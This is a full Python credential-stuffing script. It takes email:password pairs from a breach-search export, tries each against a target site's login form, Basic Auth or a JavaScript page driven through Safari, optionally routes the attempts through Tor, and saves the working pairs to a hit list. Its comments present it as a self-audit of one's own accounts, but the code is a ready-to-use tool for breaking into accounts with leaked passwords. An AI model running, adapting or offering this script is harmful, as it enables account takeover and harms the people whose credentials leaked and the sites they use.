#!/usr/bin/env python3
# check_passwords.py — test whether the username+password pairs found by LeakSearch
# still work on a site you specify.
#
# Purpose: defensive audit of your own accounts. It reads a LeakSearch export (CSV
# with "email,password,breach_sites" or TXT with one "email:password" per line),
# takes the username+password pairs it contains, and tries each pair against the
# site's real login.
#
# Login approaches handled (auto-detected, no flags needed):
#   - classic HTML form, single step (username + password on one form)
#   - two-step logins: username-only page first, password page after
#   - password-only forms (site identifies the account by session)
#   - HTTP Basic Auth (--basic)
#   - JavaScript-driven login pages (no HTML <form>): falls back to driving
#     Safari on macOS — fills the real inputs, clicks the real button, and
#     compares the outcome against a wrong-password baseline run the same way.
#
# Modes:
#   default     stops at the first live pair (one hit ends the run)
#   --inventory keeps going through every pair with a fresh, isolated session
#               per attempt, and reports the FULL list of pairs still live.
#               Optionally save the hits with --out hits.csv.
#
# Detection is heuristic (baseline failed-login comparison + form/field
# disappearance): results are "WORKS", "failed", or "unclear (verify manually)".
# Attempts are rate-limited (default 10s apart) to stay polite. Requires
# Python 3.12+ (built and tested on 3.14).
#
# Usage:
#   python3 check_passwords.py --url https://example.com/login --leaks leaks.csv
#   python3 check_passwords.py --url https://example.com/login --leaks leaks.csv --inventory --out hits.csv

import argparse
import base64
import csv
import json
import secrets
import subprocess
import sys
import time
from dataclasses import dataclass
from html.parser import HTMLParser
from pathlib import Path
from typing import Any
from urllib.parse import urljoin, urlparse

import requests

MAX_ATTEMPTS_DEFAULT = 20
DEFAULT_DELAY = 10.0
INITIAL_WAIT = 8.0   # seconds to let Safari load a page
STEP_WAIT = 6.0      # seconds to let Safari process a submit
USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) LeakSearch-self-audit"
USER_HINTS = ("user", "email", "login", "mail", "account", "nick")


@dataclass(slots=True)
class Outcome:
    """Result of one login attempt, in whatever mode the site demanded."""
    status: int | None = None
    path: str = ""
    length: int = 0
    mode: str = ""                 # single | two_step | password_only | browser
    form_gone: bool = False        # requests path: no password form after submit
    flag: str | None = None        # js_page | no_pw_form (requests path)
    pw_present: int | None = None  # browser path: visible password inputs left
    auth_ok: bool | None = None    # basic path


class FormParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.forms: list[dict[str, Any]] = []
        self._form: dict[str, Any] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        a = dict(attrs)
        if tag == "form":
            self._form = {"action": a.get("action", ""),
                          "method": (a.get("method") or "get").lower(),
                          "fields": []}
        elif tag == "input" and self._form is not None:
            self._form["fields"].append({"name": a.get("name", ""),
                                         "type": (a.get("type") or "text").lower(),
                                         "value": a.get("value", "")})
        elif tag == "button" and self._form is not None and a.get("type") == "submit" and a.get("name"):
            self._form["fields"].append({"name": a["name"], "type": "submit", "value": a.get("value", "")})

    def handle_endtag(self, tag: str) -> None:
        if tag == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None


def parse_forms(html: str) -> list[dict[str, Any]]:
    parser = FormParser()
    parser.feed(html)
    return parser.forms


def has_password_field(form: dict[str, Any]) -> bool:
    return any(f["type"] == "password" for f in form["fields"])


def password_form(forms: list[dict[str, Any]]) -> dict[str, Any] | None:
    for form in forms:
        if has_password_field(form):
            return form
    return None


def user_only_form(forms: list[dict[str, Any]]) -> dict[str, Any] | None:
    """A form that can carry a username but has no password field (two-step step 1)."""
    for form in forms:
        if has_password_field(form):
            continue
        if any(f["type"] in ("text", "email", "tel") for f in form["fields"]):
            return form
    return None


def build_payload(form: dict[str, Any], username: str, password: str) -> dict[str, str]:
    """Fill a parsed form: hidden fields preserved, password fields get the
    password, the first username-ish field (or the first text field as fallback)
    gets the username."""
    payload: dict[str, str] = {}
    user_fields: list[str] = []
    fallback: str | None = None
    for f in form["fields"]:
        name, ftype = f["name"], f["type"]
        if not name or ftype in ("submit", "button", "image"):
            continue
        if ftype == "hidden":
            payload[name] = f["value"]  # keep CSRF and friends
        elif ftype == "password":
            payload[name] = password
        elif ftype in ("text", "email", "tel"):
            if ftype == "email" or any(h in name.lower() for h in USER_HINTS):
                user_fields.append(name)
            elif fallback is None:
                fallback = name
        elif ftype == "checkbox":
            payload[name] = f["value"]
        else:
            payload[name] = f["value"]
    for i, name in enumerate(user_fields):
        payload[name] = username if i == 0 else ""
    if not user_fields and fallback is not None:
        payload[fallback] = username
    return payload


def submit_form(session: requests.Session, form: dict[str, Any], action: str, method: str,
                username: str, password: str) -> requests.Response:
    if method == "get":
        return session.get(action, params=build_payload(form, username, password), timeout=30, allow_redirects=True)
    return session.post(action, data=build_payload(form, username, password), timeout=30, allow_redirects=True)


def request_attempt(session: requests.Session, url: str, username: str, password: str) -> Outcome:
    """Submit one pair through the site's HTML forms, auto-detecting the flow.

    WordPress (wp-login.php) expects a 'wordpress_test_cookie' that its page
    JavaScript sets on load; a plain HTTP client never runs it, so it is set
    whenever the tell-tale hidden 'testcookie' field is present.
    """
    resp = session.get(url, timeout=30, allow_redirects=True)
    forms = parse_forms(resp.text)

    if any(f["name"] == "testcookie" for form in forms for f in form["fields"]):
        session.cookies.set("wordpress_test_cookie", "WP Cookie check")

    pw_form = password_form(forms)
    if pw_form is not None:
        action = urljoin(resp.url, pw_form["action"] or url)
        mode = "password_only" if not any(
            f["type"] in ("text", "email", "tel") for f in pw_form["fields"]) else "single"
        final = submit_form(session, pw_form, action, pw_form["method"], username, password)
    elif (user_form := user_only_form(forms)) is not None:
        action = urljoin(resp.url, user_form["action"] or url)
        resp2 = submit_form(session, user_form, action, user_form["method"], username, "")
        forms2 = parse_forms(resp2.text)
        pw_form2 = password_form(forms2)
        if pw_form2 is None:
            return Outcome(flag="no_pw_form", status=resp2.status_code,
                           path=urlparse(resp2.url).path, length=len(resp2.content))
        action2 = urljoin(resp2.url, pw_form2["action"] or resp2.url)
        mode = "two_step"
        final = submit_form(session, pw_form2, action2, pw_form2["method"], username, password)
    else:
        return Outcome(flag="js_page", status=resp.status_code,
                       path=urlparse(resp.url).path, length=len(resp.content))

    return Outcome(mode=mode, status=final.status_code, path=urlparse(final.url).path,
                   length=len(final.content),
                   form_gone=password_form(parse_forms(final.text)) is None)


# ---------------------------------------------------------------- Safari fallback

def _osascript(script: str, timeout: int = 90) -> subprocess.CompletedProcess[str]:
    return subprocess.run(["osascript", "-e", script], capture_output=True, text=True, timeout=timeout)


def _esc_js(js: str) -> str:
    return js.replace("\\", "\\\\").replace('"', '\\"')


def _find_tab_script(host: str) -> str:
    return (
        'tell application "Safari"\n'
        '\trepeat with w from 1 to count of windows\n'
        '\t\trepeat with i from 1 to count of tabs of window w\n'
        f'\t\t\tif URL of tab i of window w contains "{host}" then\n'
        '\t\t\t\treturn (w as text) & ":" & i\n'
        '\t\t\tend if\n'
        '\t\tend repeat\n'
        '\tend repeat\n'
        '\treturn "none"\n'
        'end tell'
    )


def _find_tab(host: str) -> tuple[int, int] | None:
    """Return (window_index, tab_index) for our tab, or None."""
    found = _osascript(_find_tab_script(host), timeout=30).stdout.strip()
    if found and ":" in found:
        w, i = found.rsplit(":", 1)
        return int(w), int(i)
    return None


def _do_js(host: str, js: str) -> str:
    """Run JS in the Safari tab whose URL contains host (fallback: front document)."""
    ref = _find_tab(host)
    if ref is not None:
        w, i = ref
        script = ('tell application "Safari"\n'
                  f'\tdo JavaScript "{_esc_js(js)}" in tab {i} of window {w}\n'
                  'end tell')
    else:
        script = ('tell application "Safari"\n'
                  f'\tdo JavaScript "{_esc_js(js)}" in front document\n'
                  'end tell')
    result = _osascript(script)
    return result.stdout.strip() if result.returncode == 0 else ""


_OPEN_SCRIPT = 'tell application "Safari"\n\tmake new document with properties {URL:"{url}"}\nend tell'


def _private_open(url: str) -> tuple[bool, str]:
    """Open a NEW PRIVATE Safari window and point it at url. Uses the File menu
    via System Events (Safari's AppleScript dictionary has no private-window
    call), so the host process needs Accessibility permission."""
    url_esc = url.replace("\\", "\\\\").replace('"', '\\"')
    script = (
        'tell application "Safari" to activate\n'
        'delay 0.6\n'
        'tell application "System Events"\n'
        '\ttell process "Safari"\n'
        '\t\tset frontmost to true\n'
        '\t\tclick menu item "New Private Window" of menu "File" of menu bar 1\n'
        '\tend tell\n'
        'end tell\n'
        'delay 0.8\n'
        'tell application "Safari"\n'
        f'\tset URL of tab 1 of window 1 to "{url_esc}"\n'
        'end tell'
    )
    result = _osascript(script)
    return result.returncode == 0, result.stderr.strip()


def browser_open(url: str, host: str, private: bool = False) -> None:
    """Open ONE Safari window (normal or private) on the site; the whole test
    runs inside it, each attempt re-navigating the same tab."""
    if private:
        ok, err = _private_open(url)
        if not ok:
            print(f"[!] Could not open a private Safari window: {err}")
            print("    System Events needs Accessibility permission for osascript — grant it in "
                  "System Settings > Privacy & Security > Accessibility, or run without --private.")
            sys.exit(1)
    else:
        result = _osascript(_OPEN_SCRIPT.format(url=url))
        if result.returncode != 0:
            print(f"[!] Could not open Safari: {result.stderr.strip()}")
            sys.exit(1)
    time.sleep(INITIAL_WAIT)


def browser_navigate(url: str, host: str) -> None:
    """Point our tab back at the login page for the next attempt."""
    ref = _find_tab(host)
    if ref is None:
        print("[!] Lost track of the Safari tab (window closed?).")
        sys.exit(1)
    w, i = ref
    url_esc = url.replace("\\", "\\\\").replace('"', '\\"')
    _osascript(f'tell application "Safari"\n\tset URL of tab {i} of window {w} to "{url_esc}"\nend tell',
               timeout=30)
    time.sleep(INITIAL_WAIT)


def close_browser_window(host: str) -> None:
    _osascript(
        'tell application "Safari"\n'
        '\trepeat with w from (count of windows) to 1 by -1\n'
        '\t\tif (count of tabs of window w) is 1 then\n'
        f'\t\t\tif URL of tab 1 of window w contains "{host}" then\n'
        '\t\t\t\tclose window w\n'
        '\t\t\t\treturn "closed"\n'
        '\t\t\tend if\n'
        '\t\tend if\n'
        '\tend repeat\n'
        '\treturn "none"\n'
        'end tell',
        timeout=30,
    )


_STATE_JS = (
    '(() => { '
    'const vis = (el) => (el.offsetWidth || el.offsetHeight); '
    "const pws = Array.from(document.querySelectorAll('input[type=password]')).filter(vis); "
    'return JSON.stringify({url: location.href, pw: pws.length, len: document.body.innerText.length}); '
    '})()'
)

_FILL_JS = (
    '(() => { '
    "const u = atob('__U__'); "
    "const p = atob('__P__'); "
    'const vis = (el) => (el.offsetWidth || el.offsetHeight); '
    "const inputs = Array.from(document.querySelectorAll('input')).filter(vis); "
    'const hinted = (el) => { '
    "const n = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '')).toLowerCase(); "
    'return ' + ' || '.join(f'n.indexOf("{h}") >= 0' for h in USER_HINTS) + '; '
    '}; '
    'const setv = (el, val) => { '
    'el.focus(); el.value = val; '
    "el.dispatchEvent(new Event('input', {bubbles: true})); "
    "el.dispatchEvent(new Event('change', {bubbles: true})); "
    '}; '
    'let userFilled = 0, pwFilled = 0, fallback = null; '
    'for (const el of inputs) { '
    "const t = (el.type || 'text').toLowerCase(); "
    "if (t === 'password' && !el.disabled && !el.readOnly) { setv(el, p); pwFilled++; } "
    "else if ((t === 'text' || t === 'email' || t === 'tel') && !el.disabled && !el.readOnly && el.form) { "
    'if (hinted(el)) { setv(el, u); userFilled++; } '
    'else if (fallback === null) { fallback = el; } '
    '} '
    '} '
    'if (userFilled === 0 && fallback !== null) { setv(fallback, u); userFilled = 1; } '
    'return JSON.stringify({userFilled: userFilled, pwFilled: pwFilled}); '
    '})()'
)

_CLICK_JS = (
    '(() => { '
    'const vis = (el) => (el.offsetWidth || el.offsetHeight); '
    "const btns = Array.from(document.querySelectorAll('button, input[type=submit], [role=button]')).filter(vis); "
    'const txt = (el) => (((el.innerText || el.value || "") + "")).toLowerCase(); '
    "let b = btns.find((el) => el.type === 'submit'); "
    'if (!b) { b = btns.find((el) => { const t = txt(el); '
    'return t.indexOf("log in") >= 0 || t.indexOf("login") >= 0 || t.indexOf("sign in") >= 0 '
    '|| t.indexOf("continue") >= 0 || t.indexOf("submit") >= 0 || t.indexOf("next") >= 0; }); } '
    'if (!b) { b = btns.find((el) => el.tagName === "BUTTON"); } '
    'if (!b) { b = btns[0]; } '
    'if (!b) { return "no-button"; } '
    'b.click(); '
    'return "clicked: " + txt(b).slice(0, 30); '
    '})()'
)


def browser_attempt(username: str, password: str, host: str) -> Outcome:
    """Submit one pair inside the already-open Safari tab. Walks multi-stage
    flows (username page -> password page) automatically."""
    u_b64 = base64.b64encode(username.encode()).decode()
    p_b64 = base64.b64encode(password.encode()).decode()
    outcome = Outcome(pw_present=1)

    for _ in range(3):  # up to 3 stages (e.g. username page, password page, redirect)
        fill_raw = _do_js(host, _FILL_JS.replace("__U__", u_b64).replace("__P__", p_b64))
        try:
            fill = json.loads(fill_raw)
        except ValueError:
            break
        _do_js(host, _CLICK_JS)
        time.sleep(STEP_WAIT)
        state_raw = _do_js(host, _STATE_JS)
        try:
            state = json.loads(state_raw)
        except ValueError:
            break
        outcome = Outcome(path=urlparse(state["url"]).path,
                          pw_present=int(state["pw"]), length=int(state["len"]))
        if fill.get("pwFilled", 0) > 0:
            break  # password was submitted this stage — final state reached
        if fill.get("userFilled", 0) == 0:
            break  # nothing recognizable to submit — stop walking
    return outcome


def classify_requests(out: Outcome, base: Outcome) -> str:
    """Compare one attempt outcome against the wrong-password baseline outcome."""
    if out.flag or base.flag:
        return "failed" if out.flag == base.flag else "unclear (verify manually)"
    same_sig = (out.status, out.path) == (base.status, base.path)
    similar_len = abs(out.length - base.length) <= max(256, base.length // 20)
    if out.form_gone:
        return "WORKS (login form gone after submit)" if not same_sig else "unclear (verify manually)"
    if not same_sig and not similar_len:
        return "probably WORKS (different response than a failed login - verify manually)"
    return "failed"


def classify_browser(out: Outcome, base: Outcome) -> str:
    if out.pw_present == 0 and base.pw_present and base.pw_present > 0:
        return "WORKS (password field gone after submit)"
    if out.path != base.path:
        return "probably WORKS (different response than a failed login - verify manually)"
    if abs(out.length - base.length) <= max(64, base.length // 10):
        return "failed"
    return "unclear (verify manually)"


def extract_pairs(path: str) -> list[tuple[str, str, str]]:
    """Pull (username, password, breach_sites) triples from a LeakSearch CSV or TXT export."""
    triples: list[tuple[str, str, str]] = []
    text = Path(path).read_text(encoding="utf-8", errors="ignore")
    if path.lower().endswith(".csv"):
        for row in csv.reader(text.splitlines()):
            if len(row) >= 2 and row[0].strip() and row[1].strip():
                triples.append((row[0].strip(), row[1], row[2] if len(row) >= 3 else ""))
    else:
        for line in text.splitlines():
            if ":" in line:
                ident, pw = line.split(":", 1)
                if ident.strip() and pw.strip():
                    triples.append((ident.strip(), pw, ""))
    seen: set[tuple[str, str]] = set()
    unique: list[tuple[str, str, str]] = []
    for user, pw, breach in triples:
        if (user.lower(), pw) not in seen:
            seen.add((user.lower(), pw))
            unique.append((user, pw, breach))
    return unique


def new_session(proxy: str | None) -> requests.Session:
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


def save_hits(path: str, hits: list[tuple[str, str, str]]) -> None:
    with open(path, "w", encoding="utf-8", newline="") as fh:
        writer = csv.writer(fh)
        writer.writerow(["email", "password", "breach_sites"])
        writer.writerows(hits)


def main() -> None:
    if sys.version_info < (3, 12):
        print("[!] check_passwords.py requires Python 3.12+ (you have "
              f"{sys.version_info.major}.{sys.version_info.minor}).")
        sys.exit(1)

    ap = argparse.ArgumentParser(description="Test LeakSearch username+password pairs against a site's login.")
    ap.add_argument("--url", required=True, help="Login page URL (or resource URL for --basic)")
    ap.add_argument("--leaks", required=True, help="LeakSearch CSV or TXT export with the pairs to test")
    ap.add_argument("--inventory", action="store_true",
                    help="Full inventory: keep testing after hits (fresh isolated session per attempt) "
                         "and report every pair still live")
    ap.add_argument("--out", default=None, help="With --inventory: save the live pairs to this CSV "
                                                "(email,password,breach_sites)")
    ap.add_argument("--basic", action="store_true", help="Site uses HTTP Basic Auth instead of a login form")
    ap.add_argument("--browser", action="store_true", help="Force the Safari fallback (auto-enters it anyway "
                                                           "when the page has no HTML form)")
    ap.add_argument("--private", action="store_true", help="Run the Safari fallback in a NEW PRIVATE window "
                                                           "(isolated cookies, discarded when closed)")
    ap.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Seconds between attempts (default 10)")
    ap.add_argument("--max", type=int, default=MAX_ATTEMPTS_DEFAULT, help="Maximum pairs to test "
                                                                          "(default 20; 0 = unlimited)")
    ap.add_argument("--proxy", default=None, help="Proxy for all attempts (e.g. socks5h://127.0.0.1:9050 for Tor, "
                                                  "http://127.0.0.1:8080). Safari fallback ignores this.")
    args = ap.parse_args()

    if args.out and not args.inventory:
        print("[!] --out only applies with --inventory.")
        sys.exit(1)
    if args.inventory and args.browser:
        print("[*] Inventory mode with the Safari fallback: forcing fresh private windows per attempt.")

    pairs = extract_pairs(args.leaks)
    if not pairs:
        print(f"[!] No username/password pairs found in {args.leaks}")
        sys.exit(1)
    if args.max > 0:
        pairs = pairs[:args.max]
    print(f"[*] {len(pairs)} unique pair(s) to test against {args.url}"
          + (" (inventory: testing all, continuing after hits)" if args.inventory else ""))

    host = urlparse(args.url).netloc
    mode = "basic" if args.basic else "requests"
    proxy = args.proxy

    if proxy:
        print(f"[*] Routing attempts through {proxy}..")
        probe = new_session(proxy).get("https://check.torproject.org/api/ip", timeout=60).json()
        print(f"[*] Exit check: IsTor={probe.get('IsTor')} ip={probe.get('IP')}")

    baseline_user, baseline_pw = pairs[0][0], "definitely-wrong-" + secrets.token_hex(8)

    match mode:
        case "basic":
            baseline_resp = new_session(proxy).get(args.url, timeout=30, allow_redirects=True,
                                                   auth=(baseline_user, baseline_pw))
            baseline = Outcome(auth_ok=False, status=baseline_resp.status_code)
            print(f"[*] Baseline (wrong password, Basic Auth): status {baseline.status}")
        case _:
            print("[*] Establishing a failed-login baseline with a random wrong password..")
            baseline = request_attempt(new_session(proxy), args.url, baseline_user, baseline_pw)
            if baseline.flag == "js_page" or args.browser:
                if baseline.flag == "js_page":
                    print("[*] No HTML form found — the page looks JavaScript-driven.")
                private = args.private or args.inventory
                print(f"[*] Falling back to driving Safari in a {'PRIVATE ' if private else ''}window "
                      "(closed afterwards)..")
                mode = "browser"
                browser_open(args.url, host, private=private)
                baseline = browser_attempt(baseline_user, baseline_pw, host)
            elif baseline.flag == "no_pw_form":
                print("[!] Submitted the username but no password form appeared — the site may use a flow "
                      "this script can't follow.")
                sys.exit(1)
            else:
                note = {"single": "single-step form",
                        "password_only": "password-only form (site identifies the account by session)"
                        }.get(baseline.mode, baseline.mode)
                print(f"[*] Baseline: {note}, status {baseline.status}, path {baseline.path}, "
                      f"{baseline.length} bytes")

    results: list[tuple[str, str, str, str]] = []
    hits: list[tuple[str, str, str]] = []
    for index, (user, password, breach) in enumerate(pairs, 1):
        time.sleep(args.delay if index > 1 else 0)
        verdict = "failed"
        match mode:
            case "basic":
                # Inventory: a fresh session per attempt so one success can't
                # authenticate later attempts.
                resp = new_session(proxy).get(args.url, timeout=30, allow_redirects=True, auth=(user, password))
                outcome = Outcome(auth_ok=resp.status_code == 200, status=resp.status_code)
                verdict = "WORKS" if resp.status_code == 200 else "failed"
            case "browser":
                if args.inventory:
                    # Fresh private window per attempt: Safari keeps ONE cookie
                    # jar across private windows, so isolation requires closing
                    # ours (and having no other private windows open).
                    close_browser_window(host)
                    browser_open(args.url, host, private=True)
                elif index > 1:
                    browser_navigate(args.url, host)
                outcome = browser_attempt(user, password, host)
                verdict = classify_browser(outcome, baseline)
            case _:
                outcome = request_attempt(new_session(proxy), args.url, user, password)
                verdict = classify_requests(outcome, baseline)

        results.append((user, password, breach, verdict))
        flag = "WORKS" if verdict.startswith(("WORKS", "probably")) else verdict
        extra = f" status={outcome.status}" if outcome.status is not None else \
                f" pw_present={outcome.pw_present}"
        print(f"  [{index}/{len(pairs)}] {user:40} {flag:52} pw={'<len %d>' % len(password)}{extra}")

        if flag == "WORKS":
            hits.append((user, password, breach))
            if not args.inventory:
                if mode in ("browser", "requests"):
                    print("[*] Session now logged in — further attempts would be unreliable, stopping here.")
                break

    print("\n===== RESULTS =====")
    for user, password, breach, verdict in results:
        shown = password if verdict.startswith(("WORKS", "probably")) else "*failed* " + password[:3] + ".."
        site = f"  [from {breach}]" if breach else ""
        print(f"  {user:40} {verdict:52} password={shown}{site}")

    if hits:
        print(f"\n[!] {len(hits)} pair(s) still live on {host}:")
        for user, password, breach in hits:
            site = f"  [from {breach}]" if breach else ""
            print(f"      {user}  /  {password}{site}")
        if args.out:
            save_hits(args.out, hits)
            print(f"[+] Hit list saved to {args.out}")
    else:
        print("\n[+] None of the leaked pairs appear to be live on this site.")

    if mode == "browser":
        close_browser_window(host)


if __name__ == "__main__":
    main()
